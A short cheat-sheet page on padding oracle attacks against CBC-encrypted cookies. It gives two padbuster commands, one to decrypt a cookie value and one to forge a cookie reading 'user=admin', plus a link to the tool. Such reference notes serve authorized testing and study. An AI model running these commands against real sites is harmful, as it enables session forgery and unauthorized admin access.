---
title: "Padding Oracle"
date: 2024-6-27
tags: ["Encryption", "Cryptography", "Web Exploitation", "Padding Oracle", "Padbuster", "Aes", "Cbc", "Cipher"]
---

### Tools

{{< tab set1 tab1 >}}padbuster{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# 8 or 16     : block size
# encoding 0  : base64
padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0
```

```console
# Forge cookie value, e.g. user=admin
padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
```

{{< /tabcontent >}}

<small>*Ref: [Download padbuster](https://github.com/AonCyberLabs/PadBuster)*</small>
